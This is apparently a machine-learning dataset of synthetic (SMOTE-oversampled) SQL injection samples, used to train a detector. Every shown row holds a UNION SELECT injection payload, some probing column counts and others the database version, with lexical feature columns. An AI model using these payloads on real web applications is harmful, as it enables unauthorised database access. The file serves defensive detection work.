id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000235,attack,union,"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",nearest_attack_euclidean,R000568,0.7663904005898681,64.07120016267518,18.98575996746496,3.7172822989642564,14.0,36.05696013014015,4.0,10.014240032535037,0.21984848875523152,0.5613073550657486,0.06281385393006614,0.1560303022489537,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.014240032535037,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000236,attack,union,"-9997' union all select 9347,9347,9347,9347,9347,9347,9347,9347#",nearest_attack_euclidean,R000319,0.18113531346179373,64.0,19.83128497321712,3.644576641584155,14.0,36.0,4.0,10.0,0.21875,0.5625,0.0625,0.15625,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000237,attack,union,"-8432  )   union all select 8169,8169,8169,8169,8169,8169,8169,8169,8169,8169--",nearest_attack_euclidean,R000259,0.4270027784652241,76.69930432311138,21.0,3.7467809495171056,14.0,42.15944345848909,8.0,12.539860864622273,0.1827248955655903,0.5494058575100476,0.10441422603748017,0.16345502088688194,0.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.539860864622273,3.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000238,attack,union,"-4135'   )    )     )   union all select 4413,4413,4413#",nearest_attack_euclidean,R000712,0.6593551435710372,55.73055423135331,19.730554231353313,3.53798826172459,14.0,16.0,18.0,7.730554231353313,0.2512247534938486,0.28711400399296977,0.32300325449209105,0.13865798802109058,0.730554231353313,0.0,1.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,2.0,1.0,0.7305542313533129,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000239,attack,union,"-2382%'  )   union all select 8885,8885,8885,8885,8885,8885,8885#",nearest_attack_euclidean,R000639,0.42928219605721174,66.46910922913453,21.0,3.4682039144130505,14.0,32.0,9.259236482115309,11.209872747019219,0.21098984418634972,0.4822625009973708,0.13805502083427754,0.16869263398200202,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.209872747019218,1.0,0.0,6.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000240,attack,union,"-3872%""   )    )     )   union all select 1637,1637,1637,1637,1637#",nearest_attack_euclidean,R000502,1.0357807294848567,69.4772807344868,22.50454385310264,3.72348651448215,14.0,27.963649175178872,16.018175412410564,11.495456146897359,0.2017657690126834,0.4009348584389099,0.2318877900934381,0.16541158245496856,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.504543853102641,1.0,0.0,4.990912293794718,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000241,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000425,0.7141819866860342,74.66572617789062,21.27785615184245,3.7347051577700365,14.0,34.8885753926302,12.332863088945313,13.444287696315104,0.18855474621397264,0.4680152949147424,0.1632950960464774,0.18013486282480756,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.7221438481575522,1.0,0.0,6.722143848157552,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000242,attack,union,"-6334'  )   union all select 3738,3738,3738,3738,3738,3738,3738,3738--",nearest_attack_euclidean,R000709,0.08490253590502789,69.66715385308605,20.066569229382793,3.575272584790503,14.0,35.733723082468835,8.0,11.933430770617209,0.2010241419905045,0.5128226542992793,0.11487093828028827,0.17128226542992792,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,6.933430770617209,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000243,attack,union,"-5169""   )    )    union all select 6198,6198,6198,6198--",nearest_attack_euclidean,R000644,0.011540667921856117,57.0,20.052173829485977,3.7916039644522814,14.0,20.0,14.0,9.0,0.24561403508771928,0.3508771929824561,0.24561403508771928,0.15789473684210525,0.0,1.0,3.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,3.0,3.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000244,attack,union,"-5424'   )    )    union all select 8231,8231,8231,8231,8231,8231,8231,8231#",nearest_attack_euclidean,R000561,0.0010936402769430073,76.00572527432615,22.00114505486523,3.7974436571811605,14.0,36.00458021946092,14.0,12.001145054865232,0.18419750587385214,0.4737072753091762,0.18419750587385214,0.1578977129431195,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.001145054865232,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000245,attack,union,"-5817' in boolean mode  )   union all select 2391,2391,2391,2391,2391--",nearest_attack_euclidean,R000675,0.0428515833906734,70.7927209604182,24.95854419208364,4.21414550733114,27.0,23.834176768334558,11.0,8.95854419208364,0.38157389380482765,0.33645838085932045,0.15545603080937423,0.12651169452647762,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.9585441920836395,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000246,attack,union,"1'  )   where 9006  =  9006 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R000385,0.04595321438909907,75.75950305860468,23.0,3.7610373907201198,42.80760244688375,9.0,14.0,9.951900611720935,0.5649961368501044,0.1188221779971382,0.18483449910665944,0.1313471860460979,1.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,4.951900611720935,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000247,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.020270607243919592,76.96744818928553,27.0,3.9456313148295985,40.0,3.0,23.0,10.967448189285541,0.5197030198955191,0.03897772649216391,0.29882923643992354,0.14249001717239332,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000248,attack,union,"-1598   )    )     )   union all select 9418,9418,9418,9418,9418,9418,9418#",nearest_attack_euclidean,R000412,0.9707258666206918,77.4440486939589,20.48880973879178,3.5663101495790177,14.0,35.91047791033425,16.044761044832878,11.488809738791781,0.18096388638076255,0.46251271417806394,0.20822736697853422,0.14829603246263925,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.511190261208219,0.0,0.0,6.977619477583561,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000249,attack,union,"-7337"" union all select 7294,7294,7294,7294,7294,7294,7294,7294,7294,7294--",nearest_attack_euclidean,R000325,0.46178834986773626,72.65714121409756,19.468571757180488,3.582065766169097,14.0,42.12571297127805,4.0,12.531428242819512,0.19291429009573985,0.5795265256048687,0.0551183685987828,0.1724408157006086,0.0,1.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.531428242819512,3.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000250,attack,union,"1%""  )   union all select null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R000758,0.6085400256547255,68.94806398608948,17.0,3.1825675101557227,46.982687995363165,1.0,9.474031993044743,11.49134399768158,0.6832258089226598,0.014578853149555232,0.13552867126111834,0.16666666666666666,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.2456719988407903,1.0,0.0,7.24567199884079,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000251,attack,union,"1%' union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R000171,0.34965979314572226,58.88095551495076,16.0,3.1878516573458278,43.504764411960615,1.0,4.0,10.376191102990154,0.7384920662411848,0.017085537155226427,0.06834214862090568,0.176080247982683,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,6.376191102990154,2.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000252,attack,union,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#",nearest_attack_euclidean,R000596,0.6043814226004648,81.0,21.51085584311146,3.634010352985932,14.0,40.0,14.0,13.0,0.1728395061728395,0.49382716049382713,0.1728395061728395,0.16049382716049382,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,8.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000253,attack,union," select * from users where id  =  1 union select @&&@,version  (    )   -- 1",nearest_attack_euclidean,R000112,0.13385620462378806,76.26199970805493,26.0,3.9037302721590117,40.0,2.130999854027465,23.130999854027465,11.0,0.5245479102020585,0.027906880818147378,0.30329453367422804,0.1442506753055661,0.0,0.0,2.130999854027464,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,6.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000254,attack,union," select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",nearest_attack_euclidean,R000018,0.44512658730154087,77.10909614882607,31.17818077023479,4.208219355627537,42.0,4.0,21.109096148826065,10.0,0.5450330104933798,0.05190790576127427,0.2732893193421601,0.1297697644031857,0.0,0.0,2.0,0.0,1.0,1.8218192297652132,0.0,0.0,0.0,0.0,1.0000000000000004,5.821819229765213,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,1.0000000000000002,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
SMOTE_000255,attack,union,"-1915%""   )    )    union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#",nearest_attack_euclidean,R000496,0.0813160467114768,81.56509378417807,22.956509378417806,3.647314161622807,14.0,39.652075027342455,14.0,13.913018756835614,0.17176298899415768,0.48591910583925446,0.1717629889941577,0.17055491617243013,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,7.913018756835615,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000256,attack,union,"-7084%' union all select 5727,5727,5727,5727,5727,5727,5727,5727,5727,5727--",nearest_attack_euclidean,R000729,0.7171262333396141,72.15317596832666,20.615317596832664,3.5434640697415216,14.0,40.92254077466133,4.0,13.230635193665332,0.19494727600546785,0.5660632687934386,0.05569922171584796,0.1832902334852456,1.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,8.230635193665332,3.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000257,attack,union," select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000039,2.384185791015625e-07,81.0,29.0,4.025983607791268,40.0,3.0,24.0,14.0,0.49382716049382713,0.03703703703703701,0.2962962962962963,0.1728395061728395,3.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,1.0,1.0000000000000004,5.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000258,attack,union,"-4542 union all select 1249,1249,1249,1249,1249,1249,1249,1249,1249--",nearest_attack_euclidean,R000225,0.10769897173387809,69.0,18.375177322617358,3.614584041228157,14.0,40.0,4.0,11.0,0.2028985507246377,0.5797101449275363,0.05797101449275363,0.15942028985507245,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0,3.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000259,attack,union,"-1922%'  )   union all select 2335,2335,2335,2335,2335,2335,2335,2335,2335,2335--",nearest_attack_euclidean,R000563,0.23899444941491987,80.91747091970635,21.082529080293654,3.5375526509449626,14.0,44.0,8.0,14.917470919706343,0.17301780974137518,0.5437702591871791,0.09886731985221439,0.18434461121923126,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.0,0.9174709197063445,0.0,9.0,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000260,attack,union,"-7171%'   )    )    union all select 5580,5580,5580,5580,5580,5580,5580,5580--",nearest_attack_euclidean,R000425,0.24609942244301808,78.33880676319727,21.0,3.6473654540337597,14.0,36.9034847018594,13.32238647360545,14.112935587732425,0.17873642059437136,0.4707620707929616,0.1703708215030806,0.18013068710958646,1.0,0.0,3.0,0.0,0.0,0.0,0.0,1.8870644122675753,1.0,0.0,7.2258711754648495,3.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000261,attack,union,"-8238'   )    )    union all select 9797,9797,9797,9797,9797,9797,9797,9797#",nearest_attack_euclidean,R000228,0.4039959484023377,78.118201666761,20.5763596666478,3.440279200276757,14.0,37.6945613334088,14.0,12.4236403333522,0.1793933035518756,0.482217576565249,0.17939330355187558,0.15899581633099985,1.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,7.4236403333522,1.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000262,attack,union,"-9871 union all select 6094,6094,6094,6094,6094,6094,6094#",nearest_attack_euclidean,R000197,0.0027955148037605,58.0104668003664,20.99790663992672,3.8707392313860667,14.0,32.00837344029313,4.0,8.002093360073282,0.2413392076614314,0.5517653864053849,0.06895405933183754,0.13794134660134622,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.002093360073282,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000263,attack,union,"1%""   )    )    union all select null,null,null,null,null,null#",nearest_attack_euclidean,R000130,0.04380086267389918,63.23182562760208,17.0,3.2576630175264123,38.18546050208166,1.0,14.0,10.046365125520415,0.602655841222684,0.015914851514299666,0.22280792120019546,0.15862138606282086,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,5.046365125520416,0.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000264,attack,union,"-7738%""  )   union all select 8754,8754,8754,8754,8754,8754,8754,8754,8754#",nearest_attack_euclidean,R000204,0.27949124768667744,75.97929127547721,22.139898753639603,3.7452033871815367,14.0,40.0,8.839392521837606,13.139898753639601,0.18443738571436086,0.526963959183888,0.11562928600552894,0.17296936909622218,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.1398987536396012,1.0,0.0,8.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000265,attack,union,"-1823 where 6852  =  6852 union all select 6852,6852,6852,6852,6852,6852#",nearest_attack_euclidean,R000393,0.953003587586969,71.43717054272781,24.0,3.9469328394437997,19.0,34.43717054272781,10.0,8.0,0.2661691005932443,0.4816706988447348,0.14008900031223384,0.11207120024978706,0.3907073643180464,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,4.609292635681953,2.0,0.3907073643180464,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000266,attack,union,"-4145%""   )    )    union all select 9404,9404,9404,9404,9404,9404,9404#",nearest_attack_euclidean,R000175,0.018895897354767387,71.90501899540375,22.0,3.6321849508017854,14.0,31.924015196323005,14.0,11.981003799080751,0.19474232393914595,0.443899750511276,0.19474232393914592,0.16661560161043212,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,5.981003799080751,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000267,attack,union," select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",nearest_attack_euclidean,R000081,0.009794611172625128,72.9889771422827,32.0,4.4099656938287195,44.0,2.0000000000000018,16.0,10.988977142282703,0.6028320026140717,0.027401454664276015,0.2192116373142079,0.15055490540744437,0.0,0.0,2.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0000000000000004,5.988977142282703,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000268,attack,union," select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",nearest_attack_euclidean,R000016,0.12754844461484802,77.47690440459006,27.0,3.9327799803626484,40.0,3.0,23.47690440459005,11.0,0.5163043329697632,0.038722824972732245,0.30298915049081965,0.1419836915666849,0.0,0.0,2.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,1.0000000000000004,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,1.0,1.0,0.9999999999999999,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
